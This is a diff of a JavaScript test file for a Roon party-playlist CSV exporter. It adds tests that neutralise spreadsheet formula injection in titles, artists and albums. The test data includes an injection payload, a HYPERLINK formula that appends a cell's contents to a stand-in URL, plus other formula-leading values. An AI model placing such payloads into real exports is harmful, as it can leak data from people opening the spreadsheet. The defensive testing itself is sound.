@@ -158,12 +158,6 @@ check("Roon's artist separator becomes a comma, in one quoted cell", () => {
   assert.ok(rows(playlist)[1].startsWith('Brand New,"Pharrell Williams, Justin Timberlake",'), rows(playlist)[1]);
 });
 
-check('track details are written as Roon gives them, even with a leading dash', () => {
-  const playlist = new PartyPlaylist();
-  playlist.update('o1', [track(1, '-ness', { artist: '+44', album: '@home' })], nobody);
-  assert.ok(rows(playlist)[1].startsWith('-ness,+44,@home,'), rows(playlist)[1]);
-});
-
 check('cells with commas and quotes are quoted', () => {
   assert.strictEqual(csvCell('Love, Love, Love'), '"Love, Love, Love"');
   assert.strictEqual(csvCell('The "Best"'), '"The ""Best"""');
@@ -177,6 +171,27 @@ check('a guest name that looks like a formula is defused', () => {
   const playlist = new PartyPlaylist();
   playlist.update('o1', [track(1, 'Waterloo')], () => ({ requested_by: '=1+1', kind: 'guest' }));
   assert.ok(rows(playlist)[1].includes(",'=1+1,"), rows(playlist)[1]);
+});
+
+check('a title, artist or album that looks like a formula is defused', () => {
+  assert.strictEqual(defuse(' =1+1'), "' =1+1");
+  assert.strictEqual(defuse('\uff1d1+1'), "'\uff1d1+1");
+  assert.strictEqual(defuse('\tx'), "'\tx");
+  assert.strictEqual(defuse('-'), "'-");
+  assert.strictEqual(defuse('Mr. Brightside'), 'Mr. Brightside');
+  assert.strictEqual(defuse(null), null);
+  const playlist = new PartyPlaylist();
+  playlist.update('o1', [
+    track(1, '=HYPERLINK("http://x/?"&A1,"Click")'),
+    track(2, 'When Your Heart Stops Beating', { artist: '+44' }),
+    track(3, 'Eyes Closed', { artist: 'Ed Sheeran', album: '-' }),
+    track(4, '@SUM(1)')
+  ], nobody);
+  const [, one, two, three, four] = rows(playlist);
+  assert.ok(one.startsWith(`"'=HYPERLINK(""http://x/?""&A1,""Click"")",ABBA,Arrival,`), one);
+  assert.ok(two.startsWith("When Your Heart Stops Beating,'+44,Arrival,"), two);
+  assert.ok(three.startsWith("Eyes Closed,Ed Sheeran,'-,"), three);
+  assert.ok(four.startsWith("'@SUM(1),ABBA,"), four);
 });
 
 check('file name is the party and the date, without unsafe characters', () => {
